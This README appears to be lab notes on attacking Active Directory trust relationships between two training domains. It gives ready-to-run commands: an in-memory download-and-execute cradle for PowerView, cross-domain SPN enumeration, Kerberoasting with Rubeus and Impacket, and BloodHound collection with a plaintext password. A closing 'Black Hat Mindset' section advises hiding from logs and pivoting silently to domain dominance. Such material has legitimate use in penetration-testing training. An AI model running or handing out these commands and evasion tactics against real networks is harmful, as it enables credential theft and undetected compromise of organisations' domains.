# Active Directory Trust Relationship README

This README explores techniques to enumerate and exploit trust relationships between domains, focusing on Service Principal Names (SPNs), Kerberoasting, and trust mapping.

## Table of Contents

- [Introduction](#introduction)
- [Setup and Prerequisites](#setup-and-prerequisites)
- [Enumeration Commands](#enumeration-commands)
- [Exploitation Techniques](#exploitation-techniques)
- [Visualization with BloodHound](#visualization-with-bloodhound)
- [Black Hat Mindset](#black-hat-mindset)
- [Resources](#resources)

## Introduction

Trust relationships in AD allow resource sharing between domains (e.g., `FREIGHTLOGISTICS.LOCAL` and `INLANEFREIGHT.LOCAL`). This guide covers PowerView, Rubeus, Impacket, and BloodHound tools to enumerate SPNs, perform Kerberoasting, and map trust relationships for exploitation. All commands assume you have a compromised host with appropriate access (e.g., domain user credentials).

## Setup and Prerequisites

- Environment: Windows or Linux host with AD access.
- PowerShell: Run with administrative privileges (right-click > "Run as Administrator") on Windows.
- PowerView: Load into memory (e.g., `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')`).
- Rubeus: Download the Rubeus executable (e.g., from its GitHub repo) and place it in your working directory (e.g., `C:\Tools\`).
- Impacket: Install on Linux (e.g., `pip install impacket`) for GetUserSPNs.py.
- BloodHound: Install the Python version on Linux (e.g., `pip install bloodhound`) and ensure Neo4j is set up for GUI analysis.
- Credentials: Obtain valid domain credentials (e.g., `INLANEFREIGHT\administrator`) for remote access or ticket requests.

## Enumeration Commands

Use these commands to gather information about trust relationships and SPNs.

```powershell
# Enumerate accounts with associated SPNs
Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName

# Retrieve mssqlsvc account details
Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc | select samaccountname,memberof

# Identify groups with foreign members
Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL

# Establish remote PowerShell session
Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator
```

## Exploitation Techniques

Exploit trust relationships and SPNs to extract credentials or escalate privileges.

```powershell
# Kerberoasting with Rubeus
.Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap

# Kerberoasting with Impacket
GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
```

## Visualization with BloodHound

Map trust relationships and attack paths using BloodHound.

```bash
# Collect data with BloodHound Python
bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2

# Compress collected data
zip -r ilfreight_bh.zip *.json
```

## Black Hat Mindset

- **Hunt for SPNs**: Target accounts with SPNs (e.g., `mssqlsvc`) for Kerberoasting across trusted domains.
- **Exploit Trusts**: Use foreign group memberships or cross-domain admin access to pivot silently.
- **Stay Invisible**: Run tools in memory (e.g., PowerView, Rubeus) and avoid logging sensitive actions.
- **Map Aggressively**: Use BloodHound to identify the shortest path to domain dominance.

## Resources

- [PowerView Documentation]()
- [Rubeus GitHub]()
- [Impacket Guide]()
- [BloodHound Documentation]()
- [AD Trust Exploitation]()

